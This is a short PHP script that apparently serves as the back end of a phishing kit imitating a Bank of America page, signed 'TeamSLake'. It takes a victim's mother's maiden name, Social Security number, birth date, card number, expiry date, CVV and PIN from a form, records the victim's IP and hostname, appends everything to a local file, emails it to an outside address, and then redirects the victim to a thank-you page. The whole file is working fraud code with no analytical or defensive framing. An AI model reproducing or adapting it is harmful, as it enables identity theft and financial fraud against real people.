<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Mother Maiden Name : ".$_POST['mmn']."\n";
$msg .= "Social Security No : ".$_POST['ssn']."\n";
$msg .= "Date of Birth	: ".$_POST['dd']."/".$_POST['mm']."/".$_POST['yy']."\n"; 
$msg .= "ATM/Card Number: : ".$_POST['card']."\n";
$msg .= "Expiry Date	: ".$_POST['mm']." / ".$_POST['yy']."\n";
$msg .= "Cvv : ".$_POST['cvv']."\n";
$msg .= "PIN : ".$_POST['pin']."\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$message .= "--------------Bofa By TeamSLake------------\n\n";
$post = "rzltmarch@eservicesincl.website";
$fp = fopen("use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "$ip - : ".$_POST['card']."\n";
$from = "From: Bofa<rzltmarch@eservicesincl.website>";
mail("$post",$subj, $msg, $from);
header("Location:  Thankyou.htm");  

?>